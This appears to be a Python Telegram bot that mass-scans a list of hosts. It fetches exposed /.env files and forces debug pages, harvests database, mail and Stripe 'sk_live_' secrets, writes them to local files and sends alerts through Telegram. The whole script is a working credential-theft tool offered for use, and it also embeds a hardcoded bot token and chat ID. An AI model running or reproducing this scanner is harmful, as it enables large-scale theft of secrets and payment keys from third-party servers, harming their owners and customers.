import os
import re
import threading
import requests
import telebot
import time
import json
import urllib3

# Suppress the SSL warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Your Telegram Bot Token
BOT_TOKEN = '7243967720:AAEgHjjfPrtZ0Is56kEUS2MII6Jt8x4Hjuw'
CHAT_ID = '7472978113'  # Replace with your chat ID

# Initialize the bot
bot = telebot.TeleBot(BOT_TOKEN)

# Statistics variables
ips_in_queue = 0
ips_scanned = 0
env_files_found = 0
debug_files_found = 0
sk_live_hits = 0

# Flag to stop the scan
stop_scan_flag = False

# Process tracking
process_stats = {}
process_lock = threading.Lock()
process_counter = 1

# The bot logic and scanning class
class ENV:
    def send_telegram_message(self, chat_id, message, file_path=None):
        try:
            if file_path:
                with open(file_path, 'rb') as file:
                    bot.send_document(chat_id, file, caption=message)
            else:
                bot.send_message(chat_id, message)
        except Exception as e:
            print(f"Failed to send message: {e}")

    def sanitize_url(self, url):
        return url.replace('https://', '')

    def scan(self, url, process_id):
        global ips_scanned, env_files_found, debug_files_found, sk_live_hits
        rr = ''
        sanitized_url = self.sanitize_url(url)
        mch_env = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', 'sk_live_', 'APP_ENV=']
        mch_debug = ['DB_HOST', 'MAIL_HOST', 'DB_CONNECTION', 'MAIL_USERNAME', 'sk_live_', 'APP_DEBUG']
        try:
            r_env = requests.get(f'https://{sanitized_url}/.env', verify=False, timeout=15, allow_redirects=False)
            r_debug = requests.post(f'https://{sanitized_url}', data={'debug': 'true'}, allow_redirects=False, verify=False, timeout=15)
            resp_env = r_env.text if r_env.status_code == 200 else ''
            resp_debug = r_debug.text if r_debug.status_code == 200 else ''
            
            if any((key in resp_env for key in mch_env)) or any((key in resp_debug for key in mch_debug)):
                rr = f'Found: https://{sanitized_url}'
                file_path = os.path.join('ENV_DEBUG', f'{sanitized_url}_env_debug.txt')
                with open(file_path, 'w', encoding='utf-8') as output:
                    output.write(f'ENV:\n{resp_env}\n\nDEBUG:\n{resp_debug}\n')
                if 'sk_live_' in resp_env or 'sk_live_' in resp_debug:
                    with open('sk.txt', 'a') as sk_file:
                        sk_file.write(f'URL: https://{sanitized_url}\n')
                        if 'sk_live_' in resp_env:
                            sk_file.write('From ENV:\n')
                            lin = resp_env.splitlines()
                            for x in lin:
                                if 'sk_live_' in x:
                                    sk_key = re.sub(f'.*sk_live_', 'sk_live_', x).replace('\"', '')
                                    sk_file.write(f'{sk_key}\n')
                                    self.send_telegram_message(CHAT_ID, f'SK HIT FOUND! URL: {sanitized_url}')
                                    with process_lock:
                                        sk_live_hits += 1
                        if 'sk_live_' in resp_debug:
                            sk_file.write('From DEBUG:\n')
                            lin = resp_debug.splitlines()
                            for x in lin:
                                if 'sk_live_' in x:
                                    sk_key = re.sub(f'.*sk_live_', 'sk_live_', x).replace('\"', '')
                                    sk_file.write(f'{sk_key}\n')
                                    self.send_telegram_message(CHAT_ID, f'SK HIT FOUND! URL: {sanitized_url}')
                                    with process_lock:
                                        sk_live_hits += 1
                        sk_file.write('\n')
                with process_lock:
                    env_files_found += 1
            else:
                rr = f'Not Found: https://{sanitized_url}/.env'
            with process_lock:
                ips_scanned += 1
            print(rr)
        except Exception:
            rr = f'Error in: https://{sanitized_url}/.env'
            print(rr)

# Command to start scanning
@bot.message_handler(commands=['start_scan'])
def start_scan(message):
    global stop_scan_flag, ips_in_queue, process_counter
    if message.reply_to_message and message.reply_to_message.document:
        # Download the file
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        # Save the file
        with open("ips.txt", 'wb') as new_file:
            new_file.write(downloaded_file)

        # Read IPs from the file
        with open("ips.txt", 'r') as ip_file:
            url_list = [line.strip() for line in ip_file if line.strip()]

        process_id = process_counter
        with process_lock:
            process_stats[process_id] = {
                'ips_in_queue': len(url_list),
                'ips_scanned': 0,
                'env_files_found': 0,
                'debug_files_found': 0,
                'sk_live_hits': 0
            }
            process_counter += 1

        stop_scan_flag = False
        bot.send_message(message.chat.id, f"Starting scan (Process ID: {process_id}). IPs in Queue: {len(url_list)}")
        threading.Thread(target=run_scan, args=(url_list, process_id)).start()
    else:
        bot.send_message(message.chat.id, "Please reply to an IP file using /start_scan.")

# Command to stop scanning
@bot.message_handler(commands=['stop_scan'])
def stop_scan(message):
    global stop_scan_flag
    stop_scan_flag = True
    bot.send_message(message.chat.id, "Scan stopped.")

# Command to display stats
@bot.message_handler(commands=['stats'])
def stats(message):
    process_id = int(message.text.split()[1])
    if process_id in process_stats:
        stats = process_stats[process_id]
        response = (
            f"Process ID: {process_id}\n"
            f"IPs in Queue: {stats['ips_in_queue']}\n"
            f"No. of IPs Scanned: {stats['ips_scanned']}\n"
            f"ENV Files Found: {stats['env_files_found']}\n"
            f"Debug Files Found: {stats['debug_files_found']}\n"
            f"SK_LIVE Hits: {stats['sk_live_hits']}"
        )
        bot.send_message(message.chat.id, response)
    else:
        bot.send_message(message.chat.id, "Invalid Process ID.")

# Command to list processes
@bot.message_handler(commands=['ls'])
def list_processes(message):
    global process_stats
    with process_lock:
        if process_stats:
            message_text = "Active Processes:\n"
            for pid, stats in process_stats.items():
                message_text += (f"Process ID: {pid}\n"
                                 f"IPs in Queue: {stats['ips_in_queue']}\n"
                                 f"No. of IPs Scanned: {stats['ips_scanned']}\n"
                                 f"ENV Files Found: {stats['env_files_found']}\n"
                                 f"Debug Files Found: {stats['debug_files_found']}\n"
                                 f"SK_LIVE Hits: {stats['sk_live_hits']}\n\n")
        else:
            message_text = "No active processes."
    bot.send_message(message.chat.id, message_text)

# Run the scan process
def run_scan(url_list, process_id):
    global stop_scan_flag
    scanner = ENV()
    for url in url_list:
        if stop_scan_flag:
            break
        scanner.scan(url, process_id)
    bot.send_message(CHAT_ID, f"Scan finished for Process ID: {process_id}.")

# Polling to keep the bot running
if __name__ == '__main__':
    bot.polling(none_stop=True)
